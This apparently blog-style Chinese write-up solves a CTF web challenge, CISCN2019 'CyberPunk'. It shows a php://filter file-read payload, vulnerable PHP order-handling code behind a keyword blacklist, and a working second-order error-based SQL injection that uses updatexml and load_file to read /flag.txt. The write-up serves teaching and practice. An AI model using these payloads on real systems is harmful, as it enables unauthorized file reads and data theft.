# [CISCN2019 华北赛区 Day1 Web5]CyberPunk 二次报错注入

buu上 做点

首先就是打开环境 开始信息收集



<img src="https://i-blog.csdnimg.cn/blog_migrate/e85ea042daec0168c5dde4cca2c53cc8.png" alt="" style="max-height:148px; box-sizing:content-box;" />


发现源代码中存在?file

提示我们多半是包含

我原本去试了试 ../../etc/passwd

失败了 直接伪协议上吧

```cobol
php://filter/read=convert.base64-encode/resource=index.php
 
 
confirm.php
 
search.php
 
change.php
 
delete.php
```

我们通过伪协议全部读取

我们提取关键信息

## index.php

```cobol
ini_set('open_basedir', '/var/www/html/');
 
// $file = $_GET["file"];
$file = (isset($_GET['file']) ? $_GET['file'] : null);
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}
?>
```

## confirm.php

```php
<?php
 
require_once "config.php";
//var_dump($_POST);
 
if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = $_POST["address"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }
 
    if($fetch->num_rows>0) {
        $msg = $user_name."已提交订单";
    }else{
        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";
        $re = $db->prepare($sql);
        $re->bind_param("sss", $user_name, $address, $phone);
        $re = $re->execute();
        if(!$re) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单提交成功";
    }
} else {
    $msg = "信息不全";
}
?>
```

## change.php

```php
<?php
 
require_once "config.php";
 
if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }
 
    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单修改成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

## delete.php

```php
<?php
 
require_once "config.php";
 
if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }
 
    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $result = $db->query('delete from `user` where `user_id`=' . $row["user_id"]);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单删除成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

## search.php

```php
<?php
 
require_once "config.php"; 
 
if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }
 
    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        if(!$row) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "<p>姓名:".$row['user_name']."</p><p>, 电话:".$row['phone']."</p><p>, 地址:".$row['address']."</p>";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

首先进行判断

每个文件中都存在 过滤即

```php
$pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
```

同时都是对

```php
 if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))
```

进行处理 但是我们能发现一个地方是没有进行处理的

在change.php的

```php
    $address = addslashes($_POST["address"]);
```

是不存在正则处理的 这里就给我们实现了注入的地方

这里的注入流程是这样的

```puppet
我们使用报错注入
 
updatexml
 
我们首先通过输入 updatexml存入数据库
 
例如
 
' and updatexml(1,,0x7e,2)#

就会作为 adress 原封不动的存入数据库

这个时候我们再一次通过修改地址来修改

因为

其中的语句

$sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];

会将原本的地址作为 old_address 输入

所以语句会修改为

$sql = "update `user` set `address`='".$address."', `old_address`='"' and updatexml(1,,0x7e,2)#"' where `user_id`=".$row['user_id'];

重点是在
`old_address`='"' and updatexml(1,,0x7e,2)#"'

这里

因为执行语句后 通过 updatexml() 会执行报错 

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        if(!$row) {
            echo 'error';
            print_r($db->error);
            exit;
        }

这样我们就实现了注入


```



<img src="https://i-blog.csdnimg.cn/blog_migrate/56ae4c5d27fd8c65f920fecb7d624297.png" alt="" style="max-height:603px; box-sizing:content-box;" />


写入报错语句



<img src="https://i-blog.csdnimg.cn/blog_migrate/c58493e42d144cad349cac6d22e3c82a.png" alt="" style="max-height:484px; box-sizing:content-box;" />


对语句进行更新 这样旧地址会输入到句子中



<img src="https://i-blog.csdnimg.cn/blog_migrate/b93acfde161a029680360c6f18a49264.png" alt="" style="max-height:145px; box-sizing:content-box;" />


实现了报错

但是这道题不在数据库中。。。。。

也不知道师傅们怎么做出来的

## 使用 load_file()函数

```bash
' and updatexml(1,concat(0x7e,(select load_file('/flag.txt'))),3)#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/87057c14b0e495c0e439b8f6906a9122.png" alt="" style="max-height:151px; box-sizing:content-box;" />


实现了报错

但是长度不够

我们通过substr即可

```bash
' and updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),30,60))),3)#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/57e72a3284aaa715cac0634d5deeda00.png" alt="" style="max-height:138px; box-sizing:content-box;" />


这道题 确实不是特别难 但是其实还是不是很简单。。。。